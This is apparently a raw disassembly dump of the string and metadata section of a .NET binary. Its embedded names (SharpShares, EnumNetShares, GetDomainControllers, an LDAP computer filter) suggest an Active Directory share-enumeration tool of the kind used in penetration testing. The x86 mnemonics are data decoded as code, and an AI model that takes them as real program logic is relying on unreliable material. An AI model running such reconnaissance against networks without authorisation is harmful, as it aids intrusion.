  403671:	74 53                	je     0x4036c6
  403673:	68 61 72 65 45       	push   $0x45657261
  403678:	6e                   	outsb  %ds:(%esi),(%dx)
  403679:	75 6d                	jne    0x4036e8
  40367b:	00 70 72             	add    %dh,0x72(%eax)
  40367e:	65 66 6d             	gs insw (%dx),%es:(%edi)
  403681:	61                   	popa
  403682:	78 6c                	js     0x4036f0
  403684:	65 6e                	outsb  %gs:(%esi),(%dx)
  403686:	00 4d 61             	add    %cl,0x61(%ebp)
  403689:	69 6e 00 47 65 74 43 	imul   $0x43746547,0x0(%esi),%ebp
  403690:	75 72                	jne    0x403704
  403692:	72 65                	jb     0x4036f9
  403694:	6e                   	outsb  %ds:(%esi),(%dx)
  403695:	74 44                	je     0x4036db
  403697:	6f                   	outsl  %ds:(%esi),(%dx)
  403698:	6d                   	insl   (%dx),%es:(%edi)
  403699:	61                   	popa
  40369a:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  4036a1:	00 53 79             	add    %dl,0x79(%ebx)
  4036a4:	73 74                	jae    0x40371a
  4036a6:	65 6d                	gs insl (%dx),%es:(%edi)
  4036a8:	2e 52                	cs push %edx
  4036aa:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4036ad:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4036b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4036b3:	00 52 65             	add    %dl,0x65(%edx)
  4036b6:	73 75                	jae    0x40372d
  4036b8:	6c                   	insb   (%dx),%es:(%edi)
  4036b9:	74 50                	je     0x40370b
  4036bb:	72 6f                	jb     0x40372c
  4036bd:	70 65                	jo     0x403724
  4036bf:	72 74                	jb     0x403735
  4036c1:	79 56                	jns    0x403719
  4036c3:	61                   	popa
  4036c4:	6c                   	insb   (%dx),%es:(%edi)
  4036c5:	75 65                	jne    0x40372c
  4036c7:	43                   	inc    %ebx
  4036c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4036c9:	6c                   	insb   (%dx),%es:(%edi)
  4036ca:	6c                   	insb   (%dx),%es:(%edi)
  4036cb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4036d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4036d1:	00 53 74             	add    %dl,0x74(%ebx)
  4036d4:	72 69                	jb     0x40373f
  4036d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4036d7:	67 43                	addr16 inc %ebx
  4036d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4036da:	6c                   	insb   (%dx),%es:(%edi)
  4036db:	6c                   	insb   (%dx),%es:(%edi)
  4036dc:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4036e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4036e2:	00 44 6f 6d          	add    %al,0x6d(%edi,%ebp,2)
  4036e6:	61                   	popa
  4036e7:	69 6e 43 6f 6e 74 72 	imul   $0x72746e6f,0x43(%esi),%ebp
  4036ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4036ef:	6c                   	insb   (%dx),%es:(%edi)
  4036f0:	6c                   	insb   (%dx),%es:(%edi)
  4036f1:	65 72 43             	gs jb  0x403737
  4036f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4036f5:	6c                   	insb   (%dx),%es:(%edi)
  4036f6:	6c                   	insb   (%dx),%es:(%edi)
  4036f7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4036fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4036fd:	00 53 65             	add    %dl,0x65(%ebx)
  403700:	61                   	popa
  403701:	72 63                	jb     0x403766
  403703:	68 52 65 73 75       	push   $0x75736552
  403708:	6c                   	insb   (%dx),%es:(%edi)
  403709:	74 43                	je     0x40374e
  40370b:	6f                   	outsl  %ds:(%esi),(%dx)
  40370c:	6c                   	insb   (%dx),%es:(%edi)
  40370d:	6c                   	insb   (%dx),%es:(%edi)
  40370e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  403713:	6e                   	outsb  %ds:(%esi),(%dx)
  403714:	00 52 65             	add    %dl,0x65(%edx)
  403717:	73 75                	jae    0x40378e
  403719:	6c                   	insb   (%dx),%es:(%edi)
  40371a:	74 50                	je     0x40376c
  40371c:	72 6f                	jb     0x40378d
  40371e:	70 65                	jo     0x403785
  403720:	72 74                	jb     0x403796
  403722:	79 43                	jns    0x403767
  403724:	6f                   	outsl  %ds:(%esi),(%dx)
  403725:	6c                   	insb   (%dx),%es:(%edi)
  403726:	6c                   	insb   (%dx),%es:(%edi)
  403727:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40372c:	6e                   	outsb  %ds:(%esi),(%dx)
  40372d:	00 6f 70             	add    %ch,0x70(%edi)
  403730:	5f                   	pop    %edi
  403731:	41                   	inc    %ecx
  403732:	64 64 69 74 69 6f 6e 	fs imul $0x7845006e,%fs:0x6f(%ecx,%ebp,2),%esi
  403739:	00 45 78 
  40373c:	63 65 70             	arpl   %esp,0x70(%ebp)
  40373f:	74 69                	je     0x4037aa
  403741:	6f                   	outsl  %ds:(%esi),(%dx)
  403742:	6e                   	outsb  %ds:(%esi),(%dx)
  403743:	00 4e 65             	add    %cl,0x65(%esi)
  403746:	74 57                	je     0x40379f
  403748:	6b 73 74 61          	imul   $0x61,0x74(%ebx),%esi
  40374c:	47                   	inc    %edi
  40374d:	65 74 49             	gs je  0x403799
  403750:	6e                   	outsb  %ds:(%esi),(%dx)
  403751:	66 6f                	outsw  %ds:(%esi),(%dx)
  403753:	00 5a 65             	add    %bl,0x65(%edx)
  403756:	72 6f                	jb     0x4037c7
  403758:	00 6c 61 6e          	add    %ch,0x6e(%ecx,%eiz,2)
  40375c:	5f                   	pop    %edi
  40375d:	67 72 6f             	addr16 jb 0x4037cf
  403760:	75 70                	jne    0x4037d2
  403762:	00 53 79             	add    %dl,0x79(%ebx)
  403765:	73 74                	jae    0x4037db
  403767:	65 6d                	gs insl (%dx),%es:(%edi)
  403769:	2e 4c                	cs dec %esp
  40376b:	69 6e 71 00 43 68 61 	imul   $0x61684300,0x71(%esi),%ebp
  403772:	72 00                	jb     0x403774
  403774:	53                   	push   %ebx
  403775:	74 72                	je     0x4037e9
  403777:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  40377e:	64 65 72 00          	fs gs jb 0x403782
  403782:	42                   	inc    %edx
  403783:	75 66                	jne    0x4037eb
  403785:	66 65 72 00          	data16 gs jb 0x403789
  403789:	44                   	inc    %esp
  40378a:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  403791:	79 53                	jns    0x4037e6
  403793:	65 61                	gs popa
  403795:	72 63                	jb     0x4037fa
  403797:	68 65 72 00 44       	push   $0x44007265
  40379c:	6f                   	outsl  %ds:(%esi),(%dx)
  40379d:	6d                   	insl   (%dx),%es:(%edi)
  40379e:	61                   	popa
  40379f:	69 6e 43 6f 6e 74 72 	imul   $0x72746e6f,0x43(%esi),%ebp
  4037a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037a7:	6c                   	insb   (%dx),%es:(%edi)
  4037a8:	6c                   	insb   (%dx),%es:(%edi)
  4037a9:	65 72 00             	gs jb  0x4037ac
  4037ac:	73 65                	jae    0x403813
  4037ae:	74 5f                	je     0x40380f
  4037b0:	46                   	inc    %esi
  4037b1:	69 6c 74 65 72 00 63 	imul   $0x6f630072,0x65(%esp,%esi,2),%ebp
  4037b8:	6f 
  4037b9:	6d                   	insl   (%dx),%es:(%edi)
  4037ba:	70 75                	jo     0x403831
  4037bc:	74 65                	je     0x403823
  4037be:	72 00                	jb     0x4037c0
  4037c0:	53                   	push   %ebx
  4037c1:	65 72 76             	gs jb  0x40383a
  4037c4:	65 72 00             	gs jb  0x4037c7
  4037c7:	4e                   	dec    %esi
  4037c8:	45                   	inc    %ebp
  4037c9:	52                   	push   %edx
  4037ca:	52                   	push   %edx
  4037cb:	5f                   	pop    %edi
  4037cc:	55                   	push   %ebp
  4037cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4037ce:	6b 6e 6f 77          	imul   $0x77,0x6f(%esi),%ebp
  4037d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4037d3:	44                   	inc    %esp
  4037d4:	65 76 44             	gs jbe 0x40381b
  4037d7:	69 72 00 76 65 72 5f 	imul   $0x5f726576,0x0(%edx),%esi
  4037de:	6d                   	insl   (%dx),%es:(%edi)
  4037df:	61                   	popa
  4037e0:	6a 6f                	push   $0x6f
  4037e2:	72 00                	jb     0x4037e4
  4037e4:	76 65                	jbe    0x40384b
  4037e6:	72 5f                	jb     0x403847
  4037e8:	6d                   	insl   (%dx),%es:(%edi)
  4037e9:	69 6e 6f 72 00 4e 65 	imul   $0x654e0072,0x6f(%esi),%ebp
  4037f0:	74 45                	je     0x403837
  4037f2:	72 72                	jb     0x403866
  4037f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4037f5:	72 00                	jb     0x4037f7
  4037f7:	49                   	dec    %ecx
  4037f8:	45                   	inc    %ebp
  4037f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4037fa:	75 6d                	jne    0x403869
  4037fc:	65 72 61             	gs jb  0x403860
  4037ff:	74 6f                	je     0x403870
  403801:	72 00                	jb     0x403803
  403803:	47                   	inc    %edi
  403804:	65 74 45             	gs je  0x40384c
  403807:	6e                   	outsb  %ds:(%esi),(%dx)
  403808:	75 6d                	jne    0x403877
  40380a:	65 72 61             	gs jb  0x40386e
  40380d:	74 6f                	je     0x40387e
  40380f:	72 00                	jb     0x403811
  403811:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  403816:	00 62 75             	add    %ah,0x75(%edx)
  403819:	66 50                	push   %ax
  40381b:	74 72                	je     0x40388f
  40381d:	00 49 6e             	add    %cl,0x6e(%ecx)
  403820:	74 50                	je     0x403872
  403822:	74 72                	je     0x403896
  403824:	00 62 75             	add    %ah,0x75(%edx)
  403827:	66 70 74             	data16 jo 0x40389e
  40382a:	72 00                	jb     0x40382c
  40382c:	53                   	push   %ebx
  40382d:	79 73                	jns    0x4038a2
  40382f:	74 65                	je     0x403896
  403831:	6d                   	insl   (%dx),%es:(%edi)
  403832:	2e 44                	cs inc %esp
  403834:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40383b:	69 63 73 00 67 65 74 	imul   $0x74656700,0x73(%ebx),%esp
  403842:	5f                   	pop    %edi
  403843:	4d                   	dec    %ebp
  403844:	61                   	popa
  403845:	78 54                	js     0x40389b
  403847:	68 72 65 61 64       	push   $0x64616572
  40384c:	73 00                	jae    0x40384e
  40384e:	73 65                	jae    0x4038b5
  403850:	74 5f                	je     0x4038b1
  403852:	4d                   	dec    %ebp
  403853:	61                   	popa
  403854:	78 54                	js     0x4038aa
  403856:	68 72 65 61 64       	push   $0x64616572
  40385b:	73 00                	jae    0x40385d
  40385d:	53                   	push   %ebx
  40385e:	65 74 4d             	gs je  0x4038ae
  403861:	61                   	popa
  403862:	78 54                	js     0x4038b8
  403864:	68 72 65 61 64       	push   $0x64616572
  403869:	73 00                	jae    0x40386b
  40386b:	53                   	push   %ebx
  40386c:	79 73                	jns    0x4038e1
  40386e:	74 65                	je     0x4038d5
  403870:	6d                   	insl   (%dx),%es:(%edi)
  403871:	2e 52                	cs push %edx
  403873:	75 6e                	jne    0x4038e3
  403875:	74 69                	je     0x4038e0
  403877:	6d                   	insl   (%dx),%es:(%edi)
  403878:	65 2e 49             	gs cs dec %ecx
  40387b:	6e                   	outsb  %ds:(%esi),(%dx)
  40387c:	74 65                	je     0x4038e3
  40387e:	72 6f                	jb     0x4038ef
  403880:	70 53                	jo     0x4038d5
  403882:	65 72 76             	gs jb  0x4038fb
  403885:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40388c:	73 74                	jae    0x403902
  40388e:	65 6d                	gs insl (%dx),%es:(%edi)
  403890:	2e 52                	cs push %edx
  403892:	75 6e                	jne    0x403902
  403894:	74 69                	je     0x4038ff
  403896:	6d                   	insl   (%dx),%es:(%edi)
  403897:	65 2e 43             	gs cs inc %ebx
  40389a:	6f                   	outsl  %ds:(%esi),(%dx)
  40389b:	6d                   	insl   (%dx),%es:(%edi)
  40389c:	70 69                	jo     0x403907
  40389e:	6c                   	insb   (%dx),%es:(%edi)
  40389f:	65 72 53             	gs jb  0x4038f5
  4038a2:	65 72 76             	gs jb  0x40391b
  4038a5:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  4038ac:	73 74                	jae    0x403922
  4038ae:	65 6d                	gs insl (%dx),%es:(%edi)
  4038b0:	2e 44                	cs inc %esp
  4038b2:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4038b9:	79 53                	jns    0x40390e
  4038bb:	65 72 76             	gs jb  0x403934
  4038be:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4038c5:	62 75 67             	bound  %esi,0x67(%ebp)
  4038c8:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  4038cf:	65 
  4038d0:	73 00                	jae    0x4038d2
  4038d2:	74 6f                	je     0x403943
  4038d4:	74 61                	je     0x403937
  4038d6:	6c                   	insb   (%dx),%es:(%edi)
  4038d7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4038d9:	74 72                	je     0x40394d
  4038db:	69 65 73 00 67 65 74 	imul   $0x74656700,0x73(%ebp),%esp
  4038e2:	5f                   	pop    %edi
  4038e3:	50                   	push   %eax
  4038e4:	72 6f                	jb     0x403955
  4038e6:	70 65                	jo     0x40394d
  4038e8:	72 74                	jb     0x40395e
  4038ea:	69 65 73 00 47 65 74 	imul   $0x74654700,0x73(%ebp),%esp
  4038f1:	46                   	inc    %esi
  4038f2:	69 6c 65 73 00 47 65 	imul   $0x74654700,0x73(%ebp,%eiz,2),%ebp
  4038f9:	74 
  4038fa:	41                   	inc    %ecx
  4038fb:	6c                   	insb   (%dx),%es:(%edi)
  4038fc:	6c                   	insb   (%dx),%es:(%edi)
  4038fd:	53                   	push   %ebx
  4038fe:	68 61 72 65 73       	push   $0x73657261
  403903:	00 53 68             	add    %dl,0x68(%ebx)
  403906:	61                   	popa
  403907:	72 70                	jb     0x403979
  403909:	53                   	push   %ebx
  40390a:	68 61 72 65 73       	push   $0x73657261
  40390f:	00 47 65             	add    %al,0x65(%edi)
  403912:	74 43                	je     0x403957
  403914:	6f                   	outsl  %ds:(%esi),(%dx)
  403915:	6d                   	insl   (%dx),%es:(%edi)
  403916:	70 75                	jo     0x40398d
  403918:	74 65                	je     0x40397f
  40391a:	72 53                	jb     0x40396f
  40391c:	68 61 72 65 73       	push   $0x73657261
  403921:	00 45 6e             	add    %al,0x6e(%ebp)
  403924:	75 6d                	jne    0x403993
  403926:	4e                   	dec    %esi
  403927:	65 74 53             	gs je  0x40397d
  40392a:	68 61 72 65 73       	push   $0x73657261
  40392f:	00 47 65             	add    %al,0x65(%edi)
  403932:	74 43                	je     0x403977
  403934:	6f                   	outsl  %ds:(%esi),(%dx)
  403935:	6d                   	insl   (%dx),%es:(%edi)
  403936:	70 75                	jo     0x4039ad
  403938:	74 65                	je     0x40399f
  40393a:	72 41                	jb     0x40397d
  40393c:	64 64 72 65          	fs fs jb 0x4039a5
  403940:	73 73                	jae    0x4039b5
  403942:	65 73 00             	gs jae 0x403945
  403945:	47                   	inc    %edi
  403946:	65 74 48             	gs je  0x403991
  403949:	6f                   	outsl  %ds:(%esi),(%dx)
  40394a:	73 74                	jae    0x4039c0
  40394c:	41                   	inc    %ecx
  40394d:	64 64 72 65          	fs fs jb 0x4039b6
  403951:	73 73                	jae    0x4039c6
  403953:	65 73 00             	gs jae 0x403956
  403956:	61                   	popa
  403957:	72 67                	jb     0x4039c0
  403959:	73 00                	jae    0x40395b
  40395b:	44                   	inc    %esp
  40395c:	6e                   	outsb  %ds:(%esi),(%dx)
  40395d:	73 00                	jae    0x40395f
  40395f:	43                   	inc    %ebx
  403960:	6f                   	outsl  %ds:(%esi),(%dx)
  403961:	6e                   	outsb  %ds:(%esi),(%dx)
  403962:	74 61                	je     0x4039c5
  403964:	69 6e 73 00 47 65 74 	imul   $0x74654700,0x73(%esi),%ebp
  40396b:	43                   	inc    %ebx
  40396c:	6f                   	outsl  %ds:(%esi),(%dx)
  40396d:	6d                   	insl   (%dx),%es:(%edi)
  40396e:	70 75                	jo     0x4039e5
  403970:	74 65                	je     0x4039d7
  403972:	72 56                	jb     0x4039ca
  403974:	65 72 73             	gs jb  0x4039ea
  403977:	69 6f 6e 73 00 53 79 	imul   $0x79530073,0x6e(%edi),%ebp
  40397e:	73 74                	jae    0x4039f4
  403980:	65 6d                	gs insl (%dx),%es:(%edi)
  403982:	2e 43                	cs inc %ebx
  403984:	6f                   	outsl  %ds:(%esi),(%dx)
  403985:	6c                   	insb   (%dx),%es:(%edi)
  403986:	6c                   	insb   (%dx),%es:(%edi)
  403987:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40398c:	6e                   	outsb  %ds:(%esi),(%dx)
  40398d:	73 00                	jae    0x40398f
  40398f:	67 65 74 5f          	addr16 gs je 0x4039f2
  403993:	44                   	inc    %esp
  403994:	6f                   	outsl  %ds:(%esi),(%dx)
  403995:	6d                   	insl   (%dx),%es:(%edi)
  403996:	61                   	popa
  403997:	69 6e 43 6f 6e 74 72 	imul   $0x72746e6f,0x43(%esi),%ebp
  40399e:	6f                   	outsl  %ds:(%esi),(%dx)
  40399f:	6c                   	insb   (%dx),%es:(%edi)
  4039a0:	6c                   	insb   (%dx),%es:(%edi)
  4039a1:	65 72 73             	gs jb  0x403a17
  4039a4:	00 47 65             	add    %al,0x65(%edi)
  4039a7:	74 44                	je     0x4039ed
  4039a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4039aa:	6d                   	insl   (%dx),%es:(%edi)
  4039ab:	61                   	popa
  4039ac:	69 6e 43 6f 6e 74 72 	imul   $0x72746e6f,0x43(%esi),%ebp
  4039b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039b4:	6c                   	insb   (%dx),%es:(%edi)
  4039b5:	6c                   	insb   (%dx),%es:(%edi)
  4039b6:	65 72 73             	gs jb  0x403a2c
  4039b9:	00 47 65             	add    %al,0x65(%edi)
  4039bc:	74 43                	je     0x403a01
  4039be:	6f                   	outsl  %ds:(%esi),(%dx)
  4039bf:	6d                   	insl   (%dx),%es:(%edi)
  4039c0:	70 75                	jo     0x403a37
  4039c2:	74 65                	je     0x403a29
  4039c4:	72 73                	jb     0x403a39
  4039c6:	00 63 6f             	add    %ah,0x6f(%ebx)
  4039c9:	6d                   	insl   (%dx),%es:(%edi)
  4039ca:	70 75                	jo     0x403a41
  4039cc:	74 65                	je     0x403a33
  4039ce:	72 73                	jb     0x403a43
  4039d0:	00 4e 45             	add    %cl,0x45(%esi)
  4039d3:	52                   	push   %edx
  4039d4:	52                   	push   %edx
  4039d5:	5f                   	pop    %edi
  4039d6:	53                   	push   %ebx
  4039d7:	75 63                	jne    0x403a3c
  4039d9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4039dc:	73 00                	jae    0x4039de
  4039de:	49                   	dec    %ecx
  4039df:	50                   	push   %eax
  4039e0:	41                   	inc    %ecx
  4039e1:	64 64 72 65          	fs fs jb 0x403a4a
  4039e5:	73 73                	jae    0x403a5a
  4039e7:	00 43 6f             	add    %al,0x6f(%ebx)
  4039ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4039eb:	63 61 74             	arpl   %esp,0x74(%ecx)
  4039ee:	00 46 6f             	add    %al,0x6f(%esi)
  4039f1:	72 6d                	jb     0x403a60
  4039f3:	61                   	popa
  4039f4:	74 00                	je     0x4039f6
  4039f6:	4f                   	dec    %edi
  4039f7:	62 6a 65             	bound  %ebp,0x65(%edx)
  4039fa:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  4039fe:	79 73                	jns    0x403a73
  403a00:	74 65                	je     0x403a67
  403a02:	6d                   	insl   (%dx),%es:(%edi)
  403a03:	2e 4e                	cs dec %esi
  403a05:	65 74 00             	gs je  0x403a08
  403a08:	53                   	push   %ebx
  403a09:	70 6c                	jo     0x403a77
  403a0b:	69 74 00 73 65 74 5f 	imul   $0x535f7465,0x73(%eax,%eax,1),%esi
  403a12:	53 
  403a13:	69 7a 65 4c 69 6d 69 	imul   $0x696d694c,0x65(%edx),%edi
  403a1a:	74 00                	je     0x403a1c
  403a1c:	53                   	push   %ebx
  403a1d:	65 61                	gs popa
  403a1f:	72 63                	jb     0x403a84
  403a21:	68 52 65 73 75       	push   $0x75736552
  403a26:	6c                   	insb   (%dx),%es:(%edi)
  403a27:	74 00                	je     0x403a29
  403a29:	67 65 74 5f          	addr16 gs je 0x403a8c
  403a2d:	43                   	inc    %ebx
  403a2e:	75 72                	jne    0x403aa2
  403a30:	72 65                	jb     0x403a97
  403a32:	6e                   	outsb  %ds:(%esi),(%dx)
  403a33:	74 00                	je     0x403a35
  403a35:	47                   	inc    %edi
  403a36:	65 74 43             	gs je  0x403a7c
  403a39:	75 72                	jne    0x403aad
  403a3b:	72 65                	jb     0x403aa2
  403a3d:	6e                   	outsb  %ds:(%esi),(%dx)
  403a3e:	74 00                	je     0x403a40
  403a40:	67 65 74 5f          	addr16 gs je 0x403aa3
  403a44:	43                   	inc    %ebx
  403a45:	6f                   	outsl  %ds:(%esi),(%dx)
  403a46:	75 6e                	jne    0x403ab6
  403a48:	74 00                	je     0x403a4a
  403a4a:	54                   	push   %esp
  403a4b:	68 72 65 61 64       	push   $0x64616572
  403a50:	53                   	push   %ebx
  403a51:	74 61                	je     0x403ab4
  403a53:	72 74                	jb     0x403ac9
  403a55:	00 4d 6f             	add    %cl,0x6f(%ebp)
  403a58:	76 65                	jbe    0x403abf
  403a5a:	4e                   	dec    %esi
  403a5b:	65 78 74             	gs js  0x403ad2
  403a5e:	00 53 79             	add    %dl,0x79(%ebx)
  403a61:	73 74                	jae    0x403ad7
  403a63:	65 6d                	gs insl (%dx),%es:(%edi)
  403a65:	2e 54                	cs push %esp
  403a67:	65 78 74             	gs js  0x403ade
  403a6a:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
  403a6e:	72 72                	jb     0x403ae2
  403a70:	61                   	popa
  403a71:	79 00                	jns    0x403a73
  403a73:	70 75                	jo     0x403aea
  403a75:	62 6c 69 63          	bound  %ebp,0x63(%ecx,%ebp,2)
  403a79:	4f                   	dec    %edi
  403a7a:	6e                   	outsb  %ds:(%esi),(%dx)
  403a7b:	6c                   	insb   (%dx),%es:(%edi)
  403a7c:	79 00                	jns    0x403a7e
  403a7e:	53                   	push   %ebx
  403a7f:	79 73                	jns    0x403af4
  403a81:	74 65                	je     0x403ae8
  403a83:	6d                   	insl   (%dx),%es:(%edi)
  403a84:	2e 44                	cs inc %esp
  403a86:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  403a8d:	79 53                	jns    0x403ae2
  403a8f:	65 72 76             	gs jb  0x403b08
  403a92:	69 63 65 73 2e 41 63 	imul   $0x63412e73,0x65(%ebx),%esp
  403a99:	74 69                	je     0x403b04
  403a9b:	76 65                	jbe    0x403b02
  403a9d:	44                   	inc    %esp
  403a9e:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  403aa5:	79 00                	jns    0x403aa7
  403aa7:	44                   	inc    %esp
  403aa8:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  403aaf:	79 45                	jns    0x403af6
  403ab1:	6e                   	outsb  %ds:(%esi),(%dx)
  403ab2:	74 72                	je     0x403b26
  403ab4:	79 00                	jns    0x403ab6
  403ab6:	6f                   	outsl  %ds:(%esi),(%dx)
  403ab7:	70 5f                	jo     0x403b18
  403ab9:	45                   	inc    %ebp
  403aba:	71 75                	jno    0x403b31
  403abc:	61                   	popa
  403abd:	6c                   	insb   (%dx),%es:(%edi)
  403abe:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  403ac5:	64 
  403ac6:	6f                   	outsl  %ds:(%esi),(%dx)
  403ac7:	77 73                	ja     0x403b3c
  403ac9:	49                   	dec    %ecx
  403aca:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  403acd:	74 69                	je     0x403b38
  403acf:	74 79                	je     0x403b4a
  403ad1:	00 49 73             	add    %cl,0x73(%ecx)
  403ad4:	4e                   	dec    %esi
  403ad5:	75 6c                	jne    0x403b43
  403ad7:	6c                   	insb   (%dx),%es:(%edi)
  403ad8:	4f                   	dec    %edi
  403ad9:	72 45                	jb     0x403b20
  403adb:	6d                   	insl   (%dx),%es:(%edi)
  403adc:	70 74                	jo     0x403b52
  403ade:	79 00                	jns    0x403ae0
  403ae0:	00 0d 45 00 52 00    	add    %cl,0x520045
  403ae6:	52                   	push   %edx
  403ae7:	00 4f 00             	add    %cl,0x0(%edi)
  403aea:	52                   	push   %edx
  403aeb:	00 3d 00 00 03 3a    	add    %bh,0x3a030000
  403af1:	00 00                	add    %al,(%eax)
  403af3:	11 7b 00             	adc    %edi,0x0(%ebx)
  403af6:	30 00                	xor    %al,(%eax)
  403af8:	7d 00                	jge    0x403afa
  403afa:	3a 00                	cmp    (%eax),%al
  403afc:	20 00                	and    %al,(%eax)
  403afe:	7b 00                	jnp    0x403b00
  403b00:	31 00                	xor    %eax,(%eax)
  403b02:	7d 00                	jge    0x403b04
  403b04:	00 15 4c 00 44 00    	add    %dl,0x44004c
  403b0a:	41                   	inc    %ecx
  403b0b:	00 50 00             	add    %dl,0x0(%eax)
  403b0e:	3a 00                	cmp    (%eax),%al
  403b10:	2f                   	das
  403b11:	00 2f                	add    %ch,(%edi)
  403b13:	00 7b 00             	add    %bh,0x0(%ebx)
  403b16:	30 00                	xor    %al,(%eax)
  403b18:	7d 00                	jge    0x403b1a
  403b1a:	00 2d 28 00 6f 00    	add    %ch,0x6f0028
  403b20:	62 00                	bound  %eax,(%eax)
  403b22:	6a 00                	push   $0x0
  403b24:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  403b28:	74 00                	je     0x403b2a
  403b2a:	43                   	inc    %ebx
  403b2b:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  403b2f:	00 73 00             	add    %dh,0x0(%ebx)
  403b32:	73 00                	jae    0x403b34
  403b34:	3d 00 63 00 6f       	cmp    $0x6f006300,%eax
  403b39:	00 6d 00             	add    %ch,0x0(%ebp)
  403b3c:	70 00                	jo     0x403b3e
  403b3e:	75 00                	jne    0x403b40
  403b40:	74 00                	je     0x403b42
  403b42:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403b46:	29 00                	sub    %eax,(%eax)
  403b48:	00 09                	add    %cl,(%ecx)
  403b4a:	6e                   	outsb  %ds:(%esi),(%dx)
  403b4b:	00 61 00             	add    %ah,0x0(%ecx)
  403b4e:	6d                   	insl   (%dx),%es:(%edi)
  403b4f:	00 65 00             	add    %ah,0x0(%ebp)
  403b52:	00 65 45             	add    %ah,0x45(%ebp)
  403b55:	00 52 00             	add    %dl,0x0(%edx)
  403b58:	52                   	push   %edx
  403b59:	00 4f 00             	add    %cl,0x0(%edi)
  403b5c:	52                   	push   %edx
  403b5d:	00 3a                	add    %bh,(%edx)
  403b5f:	00 20                	add    %ah,(%eax)
  403b61:	00 43 00             	add    %al,0x0(%ebx)
  403b64:	6f                   	outsl  %ds:(%esi),(%dx)
  403b65:	00 75 00             	add    %dh,0x0(%ebp)
  403b68:	6c                   	insb   (%dx),%es:(%edi)
  403b69:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  403b6d:	00 6e 00             	add    %ch,0x0(%esi)
  403b70:	6f                   	outsl  %ds:(%esi),(%dx)
  403b71:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  403b75:	00 67 00             	add    %ah,0x0(%edi)
  403b78:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  403b7d:	00 61 00             	add    %ah,0x0(%ecx)
  403b80:	20 00                	and    %al,(%eax)
  403b82:	6c                   	insb   (%dx),%es:(%edi)
  403b83:	00 69 00             	add    %ch,0x0(%ecx)
  403b86:	73 00                	jae    0x403b88
  403b88:	74 00                	je     0x403b8a
  403b8a:	20 00                	and    %al,(%eax)
  403b8c:	6f                   	outsl  %ds:(%esi),(%dx)
  403b8d:	00 66 00             	add    %ah,0x0(%esi)
  403b90:	20 00                	and    %al,(%eax)
  403b92:	44                   	inc    %esp
  403b93:	00 6f 00             	add    %ch,0x0(%edi)
  403b96:	6d                   	insl   (%dx),%es:(%edi)
  403b97:	00 61 00             	add    %ah,0x0(%ecx)
  403b9a:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  403ba0:	43                   	inc    %ebx
  403ba1:	00 6f 00             	add    %ch,0x0(%edi)
  403ba4:	6e                   	outsb  %ds:(%esi),(%dx)
  403ba5:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  403ba9:	00 6f 00             	add    %ch,0x0(%edi)
  403bac:	6c                   	insb   (%dx),%es:(%edi)
  403bad:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  403bb1:	00 72 00             	add    %dh,0x0(%edx)
  403bb4:	73 00                	jae    0x403bb6
  403bb6:	2e 00 00             	add    %al,%cs:(%eax)
  403bb9:	11 45 00             	adc    %eax,0x0(%ebp)
  403bbc:	52                   	push   %edx
  403bbd:	00 52 00             	add    %dl,0x0(%edx)
